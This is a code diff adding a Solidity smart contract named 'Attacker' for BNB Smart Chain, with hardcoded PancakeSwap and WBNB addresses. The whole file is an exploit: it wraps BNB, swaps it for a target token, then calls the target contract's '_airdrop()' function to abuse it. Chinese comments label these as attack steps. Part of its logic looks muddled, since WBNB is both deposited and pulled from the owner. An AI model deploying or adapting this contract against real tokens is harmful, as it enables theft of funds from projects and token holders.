@@ -1,0 +1,79 @@
+//0x10ed43c718714eb63d5aa57b78b54704e256024e
+//0x9846d848b3ea21233afbc983ffe3ba3f001f5a11
+//ow 0xBeb4aC905D616B45155284f1149487992c9B74aA
+//WBNB 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.7.0 <0.9.0;
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+interface IPancakeRouter02 {
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+
+    function WETH() external pure returns (address);
+}
+
+interface IWBNB is IERC20 {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+contract Attacker {
+    IPancakeRouter02 public pancakeRouter;
+    IERC20 public token;
+    address public owner;
+    IWBNB public wbnb;
+
+    constructor(address _pancakeRouter, address _token, address _owner, address _wbnb) {
+        pancakeRouter = IPancakeRouter02(_pancakeRouter);
+        token = IERC20(_token);
+        owner = _owner;
+        wbnb = IWBNB(_wbnb);
+    }
+
+    function attack(address target) public payable {
+        // 确保发送了足够的 BNB
+        require(msg.value >= 0.01 ether, "wbnb not enough");
+
+        // 1. 从 owner 账户发送 0.01 WBNB 给攻击合约
+        sendWBNB(0.01 ether);
+
+        // 2. 在 PancakeSwap 上交换 WBNB 为代币
+        address[] memory path = new address[](2);
+        path[0] = pancakeRouter.WETH();
+        path[1] = address(token);
+        wbnb.approve(address(pancakeRouter), 0.01 ether);
+        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            0.01 ether,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+
+        // 3. 在目标合约上调用 `_airdrop()` 函数
+        (bool success, ) = target.call(abi.encodeWithSignature("_airdrop()"));
+        require(success, "failed");
+    }
+
+    function sendWBNB(uint256 amount) public {
+        wbnb.deposit{value: amount}();
+        wbnb.transferFrom(owner, address(this), amount);
+    }
+}
